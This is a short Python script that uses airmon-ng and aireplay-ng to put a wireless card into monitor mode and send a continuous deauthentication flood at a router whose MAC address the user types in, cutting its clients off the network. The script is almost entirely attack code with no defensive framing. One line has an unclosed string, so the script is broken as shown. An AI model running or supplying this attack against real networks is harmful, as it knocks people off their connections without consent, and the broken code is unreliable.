import os 

os.system("sudo airmon-ng start wlan0")
interface = "wlan0
ent_ch = input("enter your network channel: ")
os.system(f"sudo iwconfig {interface} channel {ent_ch}")
try: 
  enter_mac_address = input("enter the ap of the router: ")
  os.system(f"sudo aireplay-ng -0 0 -a {enter_mac_address} wlan0")
except KeyboardInterrupt:
  print("exited")

